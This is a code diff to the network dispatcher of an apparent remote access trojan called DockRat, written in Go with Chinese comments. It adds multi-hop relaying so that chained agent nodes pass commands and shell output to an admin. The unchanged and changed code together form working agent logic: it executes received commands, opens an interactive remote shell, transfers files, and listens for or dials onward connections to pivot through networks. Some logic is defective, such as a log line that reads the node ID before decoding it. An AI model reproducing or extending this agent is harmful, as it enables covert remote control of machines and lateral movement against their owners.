@@ -1,3 +1,4 @@
+// file: new/core/network/dispatcher.go
 package network
 
 import (
@@ -8,20 +9,39 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-
+	"strconv"
 	"strings"
+	"sync"
 
 	"github.com/Singert/DockRat/core/protocol"
 	"github.com/Singert/DockRat/core/utils"
 	"github.com/creack/pty"
 )
 
+// 封装每个 agent 实例上下文
+type AgentContext struct {
+	SelfID     int
+	Conn       net.Conn
+	ParentConn net.Conn
+}
+
 var shellStarted = false
 var shellStdin io.WriteCloser
 
 var currentUploadFile *os.File
 
-func StartAgent(conn net.Conn) {
+var childConnMap = make(map[int]net.Conn)
+var childConnMu sync.Mutex
+
+// 用于延迟绑定连接
+var pendingConns []net.Conn
+var pendingMu sync.Mutex
+
+func StartAgent(ctx *AgentContext) {
+	conn := ctx.Conn
+	selfID := ctx.SelfID
+	parent := ctx.ParentConn
+
 	for {
 		lengthBuf := make([]byte, 4)
 		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
@@ -41,11 +61,31 @@ func StartAgent(conn net.Conn) {
 			continue
 		}
 
+		if msg.ToNodeID != 0 {
+			relayToChild(msg)
+			continue
+		}
+
 		switch msg.Type {
 		case protocol.MsgCommand:
-			handleCommand(msg, conn)
+			handleCommand(msg, conn, selfID, parent)
 		case protocol.MsgShell:
-			handleShellPTY(msg, conn)
+			if msg.FromNodeID == 0 {
+				handleShellPTY(msg, conn, selfID, parent)
+			} else {
+				if parent != nil {
+					relayUpward(msg, parent)
+				} else {
+					conn.Write(data)
+				}
+			}
+		case protocol.MsgResponse:
+			if parent != nil {
+				relayUpward(msg, parent)
+			} else {
+				encoded, _ := protocol.EncodeMessage(msg)
+				conn.Write(encoded)
+			}
 		case protocol.MsgUploadInit:
 			handleUploadInit(msg)
 		case protocol.MsgUploadChunk:
@@ -55,17 +95,36 @@ func StartAgent(conn net.Conn) {
 		case protocol.MsgDownloadInit:
 			handleDownloadInit(msg, conn)
 		case protocol.MsgListen:
-			handleListenCommand(msg)
+			handleListenCommand(msg, ctx)
 		case protocol.MsgConnect:
 			handleConnectCommand(msg)
-
+		case protocol.MsgBindRelayConn:
+			handleBindRelayConn(msg)
 		default:
 			log.Println("[-] Unknown message type:", msg.Type)
 		}
 	}
 }
 
-func handleCommand(msg protocol.Message, conn net.Conn) {
+func relayToChild(msg protocol.Message) {
+	childConnMu.Lock()
+	conn, ok := childConnMap[msg.ToNodeID]
+	childConnMu.Unlock()
+
+	if !ok {
+		log.Printf("[-] No child with ID %d found for relay\n", msg.ToNodeID)
+		return
+	}
+
+	data, err := protocol.EncodeMessage(msg)
+	if err != nil {
+		log.Println("[-] Relay encode error:", err)
+		return
+	}
+	conn.Write(data)
+}
+
+func handleCommand(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
 	var payload map[string]string
 	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 		log.Println("[-] Command unmarshal error:", err)
@@ -80,14 +139,15 @@ func handleCommand(msg protocol.Message, conn net.Conn) {
 	}
 
 	resp := protocol.Message{
-		Type:    protocol.MsgResponse,
-		Payload: output,
+		Type:       protocol.MsgResponse,
+		Payload:    output,
+		FromNodeID: selfID,
 	}
 	data, _ := protocol.EncodeMessage(resp)
 	conn.Write(data)
 }
 
-func handleShellPTY(msg protocol.Message, conn net.Conn) {
+func handleShellPTY(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
 	line := string(msg.Payload)
 
 	if !shellStarted {
@@ -109,32 +169,25 @@ func handleShellPTY(msg protocol.Message, conn net.Conn) {
 					return
 				}
 				msg := protocol.Message{
-					Type:    protocol.MsgShell,
-					Payload: buf[:n],
+					Type:       protocol.MsgShell,
+					Payload:    buf[:n],
+					FromNodeID: selfID,
 				}
 				data, err := protocol.EncodeMessage(msg)
 				if err != nil {
 					log.Println("[-] Shell encode error:", err)
 					return
 				}
-				_, err = conn.Write(data)
-				if err != nil {
-					log.Println("[-] Shell write error:", err)
-					return
-				}
+				conn.Write(data)
 			}
 		}()
 		return
 	}
 
-	// 已启动 shell，则写入 stdin
 	if !strings.HasSuffix(line, "\n") {
 		line += "\n"
 	}
-	_, err := shellStdin.Write([]byte(line))
-	if err != nil {
-		log.Println("[-] Write to shell error:", err)
-	}
+	shellStdin.Write([]byte(line))
 }
 
 func handleUploadInit(msg protocol.Message) {
@@ -219,7 +272,7 @@ func handleDownloadInit(msg protocol.Message, conn net.Conn) {
 	log.Println("[+] File download finished")
 }
 
-func handleListenCommand(msg protocol.Message) {
+func handleListenCommand(msg protocol.Message, ctx *AgentContext) {
 	var payload map[string]string
 	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 		log.Println("[-] Listen command decode failed:", err)
@@ -239,7 +292,7 @@ func handleListenCommand(msg protocol.Message) {
 				log.Println("[-] Accept failed:", err)
 				continue
 			}
-			go handleChildConn(conn)
+			go handleChildConn(conn, ctx.Conn) // 保持不变，parentConn 会在 handleChildConn 中传入
 		}
 	}()
 }
@@ -251,8 +304,8 @@ func handleConnectCommand(msg protocol.Message) {
 		return
 	}
 	target := payload["target"]
-	parentID := payload["parent_id"]
-
+	parentIDStr := payload["parent_id"] // 当前节点的 ID，将作为 child 的 parent
+	parentID, _ := strconv.Atoi(parentIDStr)
 	conn, err := net.Dial("tcp", target)
 	if err != nil {
 		log.Println("[-] Failed to connect target:", err)
@@ -266,11 +319,12 @@ func handleConnectCommand(msg protocol.Message) {
 		username = os.Getenv("USERNAME")
 	}
 
+	// 注意：这个 parent_id 会被对方当作 selfID 使用
 	payloadData := map[string]interface{}{
-		"hostname":  hostname,
-		"username":  username,
-		"os":        runtime.GOOS,
-		"parent_id": parentID,
+		"hostname": hostname,
+		"username": username,
+		"os":       runtime.GOOS,
+		"relay_id": parentID,
 	}
 	data, _ := json.Marshal(payloadData)
 	msgToSend := protocol.Message{
@@ -280,12 +334,104 @@ func handleConnectCommand(msg protocol.Message) {
 	packet, _ := protocol.EncodeMessage(msgToSend)
 	conn.Write(packet)
 
-	// 开启消息处理
-	StartAgent(conn)
+	// 将 conn 作为子节点的连接，自己是 parent（nil）→ 被连接端来处理 StartAgent
+	// 不调用 StartAgent(conn)！StartAgent 应在 handleChildConn 中由上级执行
 }
 
-func handleChildConn(conn net.Conn) {
+func handleChildConn(conn net.Conn, parentConn net.Conn) {
 	log.Println("[+] Received child connection from", conn.RemoteAddr())
-	// 直接作为一个独立 agent 启动（中继上报由 admin 处理）
-	StartAgent(conn)
+
+	// 读取 4 字节长度前缀
+	lengthBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+		log.Println("[-] Failed to read handshake length:", err)
+		conn.Close()
+		return
+	}
+	length := utils.BytesToUint32(lengthBuf)
+
+	// 读取消息内容
+	data := make([]byte, length)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		log.Println("[-] Failed to read handshake data:", err)
+		conn.Close()
+		return
+	}
+
+	// 解码 handshake 消息
+	msg, err := protocol.DecodeMessage(data)
+	if err != nil || msg.Type != protocol.MsgHandshake {
+		log.Println("[-] Invalid handshake from child")
+		conn.Close()
+		return
+	}
+	// 提取 relay_id（表示 admin 分配的最终 nodeID）
+	var payload map[string]interface{}
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Failed to parse handshake payload:", err)
+		conn.Close()
+		return
+	}
+	idFloat, ok := payload["relay_id"].(float64)
+	if !ok {
+		log.Println("[-] Missing relay_id in handshake")
+		conn.Close()
+		return
+	}
+	relayID := int(idFloat)
+
+	// 将连接存入 pendingConns，等待绑定指令
+	pendingMu.Lock()
+	pendingConns = append(pendingConns, conn)
+	pendingMu.Unlock()
+	log.Println("[+] Child handshake received, storing connection as pending")
+
+	// 启动该连接的命令处理循环（SelfID 暂未知）
+	go StartAgent(&AgentContext{
+		SelfID:     -2, // 真实 ID 尚未分配
+		Conn:       conn,
+		ParentConn: parentConn,
+	})
+	log.Printf("[*] Waiting for BindRelayConn from admin for ID %d\n", relayID)
+
+}
+
+func relayUpward(msg protocol.Message, parent net.Conn) {
+	data, err := protocol.EncodeMessage(msg)
+	if err != nil {
+		log.Println("[-] Relay upward encode error:", err)
+		return
+	}
+	_, err = parent.Write(data)
+	if err != nil {
+		log.Println("[-] Relay upward write failed:", err)
+	}
+}
+
+func handleBindRelayConn(msg protocol.Message) {
+
+	var payload protocol.BindRelayConnPayload
+	log.Println("[*] handleBindRelayConn called with ID:", payload.ID)
+
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] BindRelayConn decode error:", err)
+		return
+	}
+
+	pendingMu.Lock()
+	defer pendingMu.Unlock()
+
+	if len(pendingConns) == 0 {
+		log.Println("[-] No pending conn to bind")
+		return
+	}
+
+	conn := pendingConns[0]
+	pendingConns = pendingConns[1:]
+
+	childConnMu.Lock()
+	childConnMap[payload.ID] = conn
+	childConnMu.Unlock()
+
+	log.Printf("[+] Bound pending connection as node ID %d\n", payload.ID)
 }
